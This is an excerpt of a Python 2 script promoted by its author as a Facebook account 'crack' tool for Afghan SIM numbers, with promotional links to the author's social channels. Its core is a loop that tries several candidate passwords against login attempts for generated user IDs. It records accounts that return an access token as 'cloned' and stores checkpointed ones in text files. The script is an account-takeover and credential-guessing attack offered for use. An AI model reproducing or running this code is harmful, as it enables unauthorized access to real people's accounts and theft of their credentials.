# MY FACEBOOK ID  Raziqullah saadat 
# MY FACEBOOK GRUOP Saadat Tricks 
#MY GITHUB HTTPS:https://github.com/RaziqullahAFG
#THIS SCRIPT FREE 
...
#Saadat.Technical Youtube 

Saadat.Technical_youtube = random.choice(["https://www.youtube.com/@Saadat.Technical"])

youtuber = Saadat.Technical_youtube

def youtube():
	Style_profaisor(" SUBSCRIBE MY CHANNEL FOR APPROVED :) Thank you")
...
def telegram():
	Style_profaisor("  please Follow us on Facebook :) Thank you")
...
\033[1;91m GitHub      : https://github.com/RaziqullahAFG
\033[1;91m YouTube     : Saadat.Technical
\033[1;91m  Facebook Group   : Saadat Tricks
\033[1;91m Facebook    : Raziqullah Saadat
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY Raziqullah Saadat'
        print '\x1b[1;92m THISE SCRIPT CREATED BY Raziqullah Saadat '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[Saadat_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Saadat.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[Saadat_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[Saadat_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Saadat.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[Saadat_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Afghan.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[Saadat_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Saadat.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[Saadat_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Saadat.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[Saadat_OK] ' + k + c + user + ' | ' + pass4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[Saadat_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Afghan.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[Saadat_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Saadat.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : Saadat.txt'
